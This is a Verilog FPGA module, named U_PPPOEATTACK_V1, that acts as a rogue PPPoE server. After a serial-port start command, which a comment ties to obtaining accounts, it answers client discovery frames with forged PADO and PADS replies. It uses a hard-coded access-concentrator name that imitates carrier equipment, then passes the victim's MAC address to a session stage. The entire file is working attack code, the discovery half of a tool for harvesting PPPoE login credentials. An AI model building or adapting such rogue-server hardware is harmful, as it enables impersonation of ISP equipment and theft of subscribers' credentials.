`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 2021/10/07 21:28:16
// Design Name: stone
// Module Name: U_PPPOEATTACK_V1
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 

// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////
`define SERVER_ADDRE      48'h0c_9d_92_64_38_11 //本机MAC地址///
`define FRAM_TYPE_FIND    16'h8863              //发现阶段帧类型
`define FRAM_TYPE_SESSION 16'h8864              //会话阶段帧类型
`define EDITION_TYPE      8'h11                 //PPPOE帧的 版本和类型
`define PADI_CODE_ID      8'h09                 //代码域
`define PADO_CODE_ID      8'h07
`define PADR_CODE_ID      8'h19
`define PADS_CODE_ID      8'h65
`define SESSION_ID        16'h0000              //回话ID
`define AC_NAME           160'h01_02_00_0d_58_44_42_58_51_5f_4d_45_36_30_2d_58_38_00_00_00 //

module U_PPPOEATTACK_V1(
    input   wire                  clk                 ,
    input   wire                  rst_n               ,

    input   wire    [  31:   0]   rx_data             ,//接收的数据
    input   wire    [   1:   0]   rx_mod              ,//数据有效位数
    input   wire                  rx_dsav             ,//fifo
    input   wire                  rx_dval             ,//数据有效标志
    input   wire                  rx_sop              ,//数据开始标志
    input   wire                  rx_eop              ,//数据结束标志

    input   wire                  uart_ready          ,//上位机通过串口下发到开始获取账号标志
    output  reg                   lcp_start           ,//PPPoE会话阶段开始标志
    output  reg     [47:0]        MAC_address         ,//发送给会话阶段客户端的MAC地址
    
    input   wire                  tx_rdy              ,
    (* mark_debug = "true"*)output  reg     [  31:   0]   tx_data             ,//发送数据 
    (* mark_debug = "true"*)output  reg     [   1:   0]   tx_mod              ,//发送数据有效位数
    (* mark_debug = "true"*)output  reg                   tx_dval             ,//发送数据有效位 
    (* mark_debug = "true"*)output  reg                   tx_sop              ,//发送开始标志
    (* mark_debug = "true"*)output  reg                   tx_eop               //发送结束标志
); 


reg  [31:0]  rx_data_f   ;
reg  [1:0]   rx_mod_f    ;
reg          rx_dsav_f   ; 
reg          rx_dval_f   ;
reg          rx_sop_f    ;
reg          rx_eop_f    ;
(* mark_debug = "true"*)reg [31:0]   rx_data_ff   ;
(* mark_debug = "true"*)reg [1:0]    rx_mod_ff    ;
(* mark_debug = "true"*)reg          rx_dsav_ff  ;
(* mark_debug = "true"*)reg          rx_dval_ff   ;
(* mark_debug = "true"*)reg          rx_sop_ff    ;
(* mark_debug = "true"*)reg          rx_eop_ff    ;

parameter IDLE       = 5'b00000;
parameter PADI       = 5'b00001;
parameter PADO       = 5'b00010;
parameter PADR       = 5'b00100;
parameter PADS       = 5'b01000;
parameter LCP_START  = 5'b10000;

(* mark_debug = "true"*)reg         fifo_wren  ;//fifo写使能
(* mark_debug = "true"*)reg         fifo_ren   ;//fifo读使能
wire                         [31:0] fifo_dout  ;//读出数据
wire                                fifo_full  ;//fifo满
wire                                fifo_empty ;//fifo空

reg                          [31:0] fifo_dout_f  ;
reg                                 fifo_full_f  ;
(* mark_debug = "true"*)reg         fifo_empty_f ;
reg                                 fifo_ren_f   ;
(* mark_debug = "true"*)reg  [31:0] fifo_dout_ff ;
reg                                 fifo_full_ff ;
reg                                 fifo_empty_ff;
reg                                 fifo_ren_ff  ;
reg                                 fifo_ren_fff  ;
reg                                 fifo_ren_ffff;

(* mark_debug = "true"*)reg  [15:0] fram_type  ;//数据帧类型
(* mark_debug = "true"*)reg  [7:0]  code_id    ;//代码ID
(* mark_debug = "true"*)reg  [47:0] cilent_addr;//客户端MAC地址
                        reg  [15:0] rx_fram_len;//接受数据帧的载荷帧长
 
(* mark_debug = "true"*)reg  [4:0] cnt_PADO;//发送PADO计数，用于判断输出哪个PADO数据
(* mark_debug = "true"*)reg  [4:0] cnt_PADS;//发送PADS计数，用于判断输出哪个PADS数据
                        reg  [3:0] cnt_fifo;//fifo读出计数

(* mark_debug = "true"*)reg  [159:0] fram_head_PADO;//PADO帧头
(* mark_debug = "true"*)reg  [159:0] fram_head_PADS;//PADS帧头
                        reg  [159:0] ac_name;       //AC_NAME

wire fifo_ren_n;
wire fifo_ren_nn;

(* mark_debug = "true"*)reg [7:0] c_state;
                        reg [7:0] n_state;
always@(posedge clk or negedge rst_n)
begin
    if (rst_n == 1'b0)
        c_state <= IDLE;
    else 
        c_state <= n_state;
end

always@(*)
begin
    case (c_state)
        IDLE://等待开始命令
            if ((uart_ready == 1'b1) && (rx_dval_f == 1'b1))
                n_state = PADI;
            else 
                n_state = IDLE;
        PADI://等待PADI帧发送完毕
            if ((fram_type == `FRAM_TYPE_FIND) && (code_id == `PADI_CODE_ID) && (rx_eop_ff == 1'b1) && (tx_rdy == 1'b1))
                n_state = PADO;
            else
                n_state = PADI;
        PADO://向客户端发送PADO
            if (tx_eop == 1'b1)
                n_state = PADR;
            else 
                n_state = PADO;
        PADR://等待客户端发送PADR帧
            if ((fram_type == `FRAM_TYPE_FIND) && (code_id == `PADR_CODE_ID) && (rx_eop_ff == 1'b1) && (tx_rdy == 1'b1))
                n_state = PADS;
            else
                n_state = PADR;
        PADS://向客户端发送PADS帧
            if (tx_eop == 1'b1)
                n_state = LCP_START;
            else 
                n_state = PADS;
        LCP_START://发送会话阶段开始标志和客户端MAC地址
            n_state = PADI;
        default:
            n_state = IDLE;
    endcase
end

//============================================
//                 打 拍
//============================================
always@(posedge clk or negedge rst_n)
begin
    if (rst_n == 1'b0) begin
        rx_data_f   <= 32'b0;
        rx_mod_f    <= 2'b0;
        rx_dsav_f  <= 1'b0;
        rx_dval_f   <= 1'b0;
        rx_sop_f    <= 1'b0;
        rx_eop_f    <= 1'b0;
        rx_data_ff   <= 32'b0;
        rx_mod_ff    <= 2'b0;
        rx_dsav_ff   <= 1'b0;
        rx_dval_ff   <= 1'b0;
        rx_sop_ff    <= 1'b0;
        rx_eop_ff    <= 1'b0;
    end
    else begin
        rx_data_f   <= rx_data;
        rx_mod_f    <= rx_mod ;
        rx_dsav_f  <= rx_dsav;
        rx_dval_f   <= rx_dval;
        rx_sop_f    <= rx_sop ;
        rx_eop_f    <= rx_eop ;
        rx_data_ff  <= rx_data_f ;
        rx_mod_ff   <= rx_mod_f  ;
        rx_dsav_ff  <= rx_dsav_f;
        rx_dval_ff  <= rx_dval_f ;
        rx_sop_ff   <= rx_sop_f  ;
        rx_eop_ff   <= rx_eop_f  ;
    end
end

always@(posedge clk or negedge rst_n)
begin
   if (rst_n == 1'b0) begin
       fifo_dout_f   <= 32'b0 ;
       fifo_full_f   <= 1'b0  ;  
       fifo_empty_f  <= 1'b0  ;  
       fifo_ren_f    <= 1'b0  ;    
       fifo_dout_ff  <= 32'b0 ;        
       fifo_full_ff  <= 1'b0  ;        
       fifo_empty_ff <= 1'b0  ; 
       fifo_ren_ff   <= 1'b0  ; 
   end 
   else begin
       fifo_dout_f   <= fifo_dout   ;
       fifo_full_f   <= fifo_full   ;
       fifo_empty_f  <= fifo_empty  ;
       fifo_ren_f    <= fifo_ren    ;
       fifo_dout_ff  <= fifo_dout_f ;
       fifo_full_ff  <= fifo_full_f ;
       fifo_empty_ff <= fifo_empty_f;
       fifo_ren_ff   <= fifo_ren_f  ;
       fifo_ren_fff  <= fifo_ren_ff ;
       fifo_ren_ffff  <= fifo_ren_fff ;
   end
end
assign  fifo_ren_n = ~fifo_ren_ff && fifo_ren_fff;
assign  fifo_ren_nn = ~fifo_ren_fff && fifo_ren_ffff;
//============================================

//============================================
//       接受帧时对数据帧中的数据计数
//============================================
(* mark_debug = "true"*)reg [3:0]  cnt;
always@(posedge clk or negedge rst_n)
begin
    if (rst_n == 1'b0) begin
        cnt <= 4'b0;
    end
    else begin
        if (((n_state == PADI) && (rx_dval_f == 1'b1) ) || ((n_state == PADR) && (rx_dval_f == 1'b1))) cnt <= cnt + 1'b1;
        else cnt <= 1'b0;
    end
end
//============================================

//============================================
// 提取客户端MAC地址、帧类型、代码ID、载荷帧长
//============================================
always@(posedge clk or negedge rst_n)
begin
    if(rst_n == 1'b0) begin
        cilent_addr <= 48'b0;
    end
    else begin
        if (cnt == 4'd2 && n_state == PADI) begin
            cilent_addr[47:32] <= rx_data_ff[15:0];
        end
        else if (cnt == 4'd3 && n_state == PADI) begin
            cilent_addr[31:0] <= rx_data_ff;
        end
        else begin
            cilent_addr <= cilent_addr;
        end
    end
end

always@(posedge clk or negedge rst_n)
begin
    if(rst_n == 1'b0) begin
        fram_type <= 16'b0;
        code_id <= 8'b0;
        rx_fram_len <= 16'b0; 
    end
    else begin
        if (cnt == 4'd4) begin
            fram_type <= rx_data_ff[31:16];
            code_id <= rx_data_ff[7:0];
        end
        else if (cnt == 4'd5)
            rx_fram_len <= rx_data_ff[15:0];
        else begin
            fram_type <= fram_type;
            code_id <= code_id;
            rx_fram_len <= rx_fram_len;
        end
    end
end
//============================================

//============================================
//          PADO、PADS、FIFO计数
//============================================
always@(posedge clk or negedge rst_n)
begin
    if(rst_n == 1'b0)
        cnt_PADO <= 5'b0;
    else begin
        if ((n_state == PADO) && (cnt_PADO == 5'd6) && (fifo_empty_ff == 1'b1)) cnt_PADO <= cnt_PADO + 1'b1;//fifo空了，输出AC_name
        else if ((n_state == PADO) && (cnt_PADO == 5'd6)) cnt_PADO <= 5'd6;//读fifo
        else if((n_state == PADO) && (tx_eop == 1'b1)) cnt_PADO <= 5'b0;//发送结束，清零
        else if (n_state == PADO) cnt_PADO <= cnt_PADO + 1'b1;//发送帧头
        else cnt_PADO <= 5'b0;
    end
end

always@(posedge clk or negedge rst_n)
begin
    if(rst_n == 1'b0)
        cnt_PADS <= 5'b0;
    else begin
        if ((n_state == PADS) && (cnt_PADS == 5'd6)) cnt_PADS <= 5'd6;//读fifo
        else if((n_state == PADS) && (tx_eop == 1'b1)) cnt_PADS <= 5'b0;//发送结束清零
        else if (n_state == PADS) cnt_PADS <= cnt_PADS + 1'b1;//发送帧头
        else cnt_PADS <= 5'b0;
    end
end

always@(posedge clk or negedge rst_n)
begin
    if (rst_n == 1'b0) cnt_fifo <= 4'b0;
    else if (cnt >= 4'd5) cnt_fifo <= cnt_fifo + 1'b1;//帧头发送完毕，发送fifo
    else cnt_fifo <= 4'b0;
end
//============================================

//============================================
//              事先算好帧头
//============================================
always@(posedge clk or negedge rst_n)
begin
    if (rst_n == 1'b0) begin
        fram_head_PADO <= 160'b0;
        fram_head_PADS <= 160'b0;
        ac_name        <= 150'b0;
    end
    else begin
        fram_head_PADO <= {cilent_addr, `SERVER_ADDRE, `FRAM_TYPE_FIND, `EDITION_TYPE, `PADO_CODE_ID, `SESSION_ID, {rx_fram_len + 16'h11}};
        fram_head_PADS <= {cilent_addr, `SERVER_ADDRE, `FRAM_TYPE_FIND, `EDITION_TYPE, `PADS_CODE_ID, 16'habcd, rx_fram_len};
        ac_name        <= `AC_NAME;
    end
end
//============================================

//============================================
//              PADO、PADS发送
//============================================
always@(posedge clk or negedge rst_n)
begin
    if(rst_n == 1'b0) begin
        tx_data <= 32'b1;  
    end
    else begin
        if (c_state == PADO) begin
            case (cnt_PADO)
                5'b1: tx_data <= fram_head_PADO[159:128];
                5'd2: tx_data <= fram_head_PADO[127:96];
                5'd3: tx_data <= fram_head_PADO[95:64];
                5'd4: tx_data <= fram_head_PADO[63:32];
                5'd5: tx_data <= fram_head_PADO[31:0];
                5'd6: tx_data <= fifo_dout_ff;//发送载荷
                5'd7: tx_data <= ac_name[159:128];//发送AC_NAME
                5'd8: tx_data <= ac_name[127:96];
                5'd9: tx_data <= ac_name[95:64];
                5'd10: tx_data <= ac_name[63:32];
                5'd11: tx_data <= ac_name[31:0];
                default: tx_data <= 32'h2;
            endcase
        end
        else if (c_state == PADS) begin
            case (cnt_PADS)
                5'b1: tx_data <= fram_head_PADS[159:128];
                5'd2: tx_data <= fram_head_PADS[127:96];
                5'd3: tx_data <= fram_head_PADS[95:64];
                5'd4: tx_data <= fram_head_PADS[63:32];
                5'd5: tx_data <= fram_head_PADS[31:0];
                5'd6: tx_data <= fifo_dout_ff;//发送载荷
                default: tx_data <= 32'h3;
            endcase
        end
        else tx_data <= tx_data;
    end
end

always@(posedge clk or negedge rst_n)
begin
   if(rst_n == 1'b0) begin
       tx_mod  <= 2'b0 ;
       tx_dval <= 1'b0 ;
       tx_sop  <= 1'b0 ;
       tx_eop  <= 1'b0 ;
   end 
   else begin
        if (c_state == PADO)
            case (cnt_PADO)
                5'b1: {tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b1, 1'b1, 1'b0};
                5'd2: {tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b1, 1'b0, 1'b0};
                5'd11:{tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b01, 1'b1, 1'b0, 1'b1};
                5'd12:{tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b0, 1'b0, 1'b0};
                default: {tx_mod, tx_dval, tx_sop, tx_eop} <= {tx_mod, tx_dval, tx_sop, tx_eop};
            endcase
        else if (c_state == PADS) begin
            if(cnt_PADS == 5'b1) {tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b1, 1'b1, 1'b0};
            else if (cnt_PADS == 5'd2) {tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b1, 1'b0, 1'b0};
            else if (fifo_ren_n == 1'b1) {tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b1, 1'b0, 1'b1};
            else if (fifo_ren_nn == 1'b1) {tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b0, 1'b0, 1'b0};
            else  {tx_mod, tx_dval, tx_sop, tx_eop} <= {tx_mod, tx_dval, tx_sop, tx_eop};
        end
        else {tx_mod, tx_dval, tx_sop, tx_eop} <= {2'b0, 1'b0, 1'b0, 1'b0};
   end
end
//============================================

//============================================
//       发送会话阶段开始标志、MAC地址
//============================================
always@(posedge clk or negedge rst_n)
begin
    if (rst_n == 1'b0) begin
        lcp_start <= 1'b0;
        MAC_address <= 48'b0;
    end
    else if (c_state == LCP_START) begin
        lcp_start <= 1'b1;
        MAC_address <= cilent_addr;
    end 
    else begin
        lcp_start <= 1'b0;
        MAC_address <= 48'b0;
    end
end
//============================================

//============================================
//                fifo读、写
//============================================
always@(*)
begin
    if((cnt_PADO == 5'd3) || (cnt_PADS == 5'd3)) fifo_ren <= 1'b1;
    else if(fifo_empty == 1'b1) fifo_ren <= 1'b0;
    else fifo_ren <= fifo_ren;
end

always@(*)//头部发送完毕而且fifo计数<=载荷帧长，写
begin     //写数据条件一定要严格，因为网络会定时发送无用帧来保持链接，不能把无用帧的载荷存到fifo里面，否则下次读的时候会把无用帧的载荷也读出来加到PADO或者PADS中
        if (cnt > 4'd5 && ((c_state == PADI && code_id == `PADI_CODE_ID) || (c_state == PADR && code_id == `PADR_CODE_ID)) && rx_dval_ff == 1'b1 && (fram_type == 16'h8863) && ((cnt_fifo << 2) <= rx_fram_len )) fifo_wren = 1'b1;
        else fifo_wren = 1'b0;
end
//============================================

sync_fifo #(
    .WIDTH (32),
    .ADDR (6)
) U_sync_fifo(
    .clk   (clk         ),
    .rst_n (rst_n       ), 
    .din   (rx_data_ff  ),
    .wr_en (fifo_wren   ), 
    .full  (fifo_full   ), 
    .dout  (fifo_dout   ),
    .rd_en (fifo_ren    ), 
    .empty (fifo_empty)
);

endmodule
